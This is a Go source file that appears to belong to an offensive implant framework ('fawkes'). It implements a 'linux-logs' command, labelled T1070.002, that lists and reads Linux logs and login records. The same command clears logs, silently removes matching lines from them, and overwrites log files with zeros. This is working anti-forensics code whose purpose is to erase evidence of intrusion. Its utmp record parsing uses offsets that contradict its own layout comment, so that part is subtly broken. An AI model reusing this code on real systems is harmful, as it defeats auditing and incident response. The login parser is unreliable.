//go:build linux

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type LinuxLogsCommand struct{}

func (c *LinuxLogsCommand) Name() string { return "linux-logs" }
func (c *LinuxLogsCommand) Description() string {
	return "List, read, clear, or tamper with Linux log files and login records (T1070.002)"
}

type linuxLogsArgs struct {
	Action string `json:"action"`
	File   string `json:"file"`
	Lines  int    `json:"lines"`
	Search string `json:"search"`
	User   string `json:"user"`
}

// Common log file locations
var logFiles = []string{
	"/var/log/auth.log",
	"/var/log/syslog",
	"/var/log/messages",
	"/var/log/secure",
	"/var/log/kern.log",
	"/var/log/daemon.log",
	"/var/log/dpkg.log",
	"/var/log/apt/history.log",
	"/var/log/yum.log",
	"/var/log/cron",
	"/var/log/mail.log",
	"/var/log/lastlog",
	"/var/log/faillog",
}

// Binary login record files
var loginRecordFiles = []string{
	"/var/log/wtmp",
	"/var/log/btmp",
	"/var/run/utmp",
}

func (c *LinuxLogsCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: list, read, logins, clear, truncate, shred",
			Status:    "error",
			Completed: true,
		}
	}

	var args linuxLogsArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Plain text fallback: "list", "read /var/log/auth.log", "logins"
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.File = parts[1]
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return linuxLogsList()
	case "read":
		return linuxLogsRead(args)
	case "logins":
		return linuxLogsLogins(args)
	case "clear":
		return linuxLogsClear(args)
	case "truncate":
		return linuxLogsTruncate(args)
	case "shred":
		return linuxLogsShred(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: list, read, logins, clear, truncate, shred", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func linuxLogsList() structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Log Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	count := 0
	for _, path := range logFiles {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		count++
		modTime := info.ModTime().Format("2006-01-02 15:04:05")
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes, modified %s)\n", count, path, info.Size(), modTime))
	}
	if count == 0 {
		sb.WriteString("  (none found)\n")
	}

	sb.WriteString("\nLogin Record Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	loginCount := 0
	for _, path := range loginRecordFiles {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		loginCount++
		modTime := info.ModTime().Format("2006-01-02 15:04:05")
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes, modified %s)\n", loginCount, path, info.Size(), modTime))
	}
	if loginCount == 0 {
		sb.WriteString("  (none found)\n")
	}

	// Also check for rotated logs
	sb.WriteString("\nRotated Logs (/var/log/*.gz)\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	rotated, _ := filepath.Glob("/var/log/*.gz")
	rotated2, _ := filepath.Glob("/var/log/*.1")
	allRotated := append(rotated, rotated2...)
	if len(allRotated) > 0 {
		for i, path := range allRotated {
			info, _ := os.Stat(path)
			if info != nil {
				sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes)\n", i+1, path, info.Size()))
			}
		}
	} else {
		sb.WriteString("  (none found)\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func linuxLogsRead(args linuxLogsArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required (e.g., /var/log/auth.log)",
			Status: "error", Completed: true,
		}
	}

	content, err := os.ReadFile(args.File)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading %s: %v", args.File, err),
			Status: "error", Completed: true,
		}
	}

	lines := strings.Split(strings.TrimRight(string(content), "\n"), "\n")

	// Apply search filter if specified
	if args.Search != "" {
		var filtered []string
		for _, line := range lines {
			if strings.Contains(strings.ToLower(line), strings.ToLower(args.Search)) {
				filtered = append(filtered, line)
			}
		}
		lines = filtered
	}

	maxLines := args.Lines
	if maxLines < 1 {
		maxLines = 50
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== %s (%d lines total", args.File, len(lines)))
	if args.Search != "" {
		sb.WriteString(fmt.Sprintf(", filtered by '%s'", args.Search))
	}
	sb.WriteString(") ===\n")

	start := 0
	if len(lines) > maxLines {
		start = len(lines) - maxLines
		sb.WriteString(fmt.Sprintf("(showing last %d lines)\n", maxLines))
	}
	for i := start; i < len(lines); i++ {
		sb.WriteString(lines[i] + "\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// utmpRecordSize is 384 bytes on x86_64 Linux
// Fields: Type(2) + pad(2) + PID(4) + Line(32) + ID(4) + User(32) + Host(256) + Exit(4) + Session(4) + TV(8) + Addr(16) + reserved(20)
const utmpRecordSize = 384

func linuxLogsLogins(args linuxLogsArgs) structs.CommandResult {
	var sb strings.Builder

	files := loginRecordFiles
	if args.File != "" {
		files = []string{args.File}
	}

	for _, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		sb.WriteString(fmt.Sprintf("=== %s ===\n", path))

		numRecords := len(data) / utmpRecordSize
		count := 0
		maxRecords := args.Lines
		if maxRecords < 1 {
			maxRecords = 50
		}

		// Read from end (most recent first)
		start := 0
		if numRecords > maxRecords {
			start = numRecords - maxRecords
			sb.WriteString(fmt.Sprintf("(showing last %d of %d records)\n", maxRecords, numRecords))
		}

		for i := start; i < numRecords; i++ {
			offset := i * utmpRecordSize
			if offset+utmpRecordSize > len(data) {
				break
			}

			record := data[offset : offset+utmpRecordSize]
			recType := int16(binary.LittleEndian.Uint16(record[0:2]))
			pid := int32(binary.LittleEndian.Uint32(record[4:8]))
			user := strings.TrimRight(string(record[12:44]), "\x00")
			host := strings.TrimRight(string(record[44:300]), "\x00")
			line := strings.TrimRight(string(record[8:12]), "\x00")
			tvSec := int64(binary.LittleEndian.Uint32(record[340:344]))
			ts := time.Unix(tvSec, 0).Format("2006-01-02 15:04:05")

			// Filter by user if specified
			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
				continue
			}

			// Skip empty records
			if recType == 0 && user == "" {
				continue
			}

			typeName := utmpTypeName(recType)
			if user != "" || recType > 0 {
				sb.WriteString(fmt.Sprintf("  %s | %-8s | %-12s | %-15s | PID=%-6d | %s\n",
					ts, typeName, user, host, pid, line))
				count++
			}
		}

		if count == 0 {
			sb.WriteString("  (no records)\n")
		}
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func utmpTypeName(t int16) string {
	switch t {
	case 1:
		return "RUN_LVL"
	case 2:
		return "BOOT"
	case 5:
		return "INIT"
	case 6:
		return "LOGIN"
	case 7:
		return "USER"
	case 8:
		return "DEAD"
	default:
		return fmt.Sprintf("TYPE_%d", t)
	}
}

func linuxLogsClear(args linuxLogsArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required (e.g., /var/log/auth.log)",
			Status: "error", Completed: true,
		}
	}

	// Truncate file to zero bytes (preserves file permissions and inode)
	if err := os.Truncate(args.File, 0); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error clearing %s: %v", args.File, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Cleared: %s (truncated to 0 bytes)", args.File),
		Status:    "success",
		Completed: true,
	}
}

func linuxLogsTruncate(args linuxLogsArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required",
			Status: "error", Completed: true,
		}
	}

	content, err := os.ReadFile(args.File)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading %s: %v", args.File, err),
			Status: "error", Completed: true,
		}
	}

	if args.Search == "" {
		return structs.CommandResult{
			Output: "Error: search parameter required (lines matching this string will be removed)",
			Status: "error", Completed: true,
		}
	}

	lines := strings.Split(string(content), "\n")
	var kept []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), strings.ToLower(args.Search)) {
			removed++
			continue
		}
		kept = append(kept, line)
	}

	if removed == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No lines matching '%s' found in %s", args.Search, args.File),
			Status:    "success",
			Completed: true,
		}
	}

	if err := os.WriteFile(args.File, []byte(strings.Join(kept, "\n")), 0644); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error writing %s: %v", args.File, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d lines matching '%s' from %s", removed, args.Search, args.File),
		Status:    "success",
		Completed: true,
	}
}

func linuxLogsShred(args linuxLogsArgs) structs.CommandResult {
	if args.File == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required",
			Status: "error", Completed: true,
		}
	}

	info, err := os.Stat(args.File)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error: %v", err),
			Status: "error", Completed: true,
		}
	}

	size := info.Size()

	// Overwrite with zeros 3 times
	f, err := os.OpenFile(args.File, os.O_WRONLY, 0)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error opening %s: %v", args.File, err),
			Status: "error", Completed: true,
		}
	}

	zeros := make([]byte, 4096)
	for pass := 0; pass < 3; pass++ {
		if _, err := f.Seek(0, 0); err != nil {
			f.Close()
			return structs.CommandResult{
				Output: fmt.Sprintf("Error seeking %s: %v", args.File, err),
				Status: "error", Completed: true,
			}
		}
		remaining := size
		for remaining > 0 {
			writeSize := int64(len(zeros))
			if remaining < writeSize {
				writeSize = remaining
			}
			if _, err := f.Write(zeros[:writeSize]); err != nil {
				break
			}
			remaining -= writeSize
		}
		_ = f.Sync()
	}
	f.Close()

	// Truncate to zero
	_ = os.Truncate(args.File, 0)

	return structs.CommandResult{
		Output:    fmt.Sprintf("Shredded: %s (3-pass zero overwrite, %d bytes destroyed)", args.File, size),
		Status:    "success",
		Completed: true,
	}
}
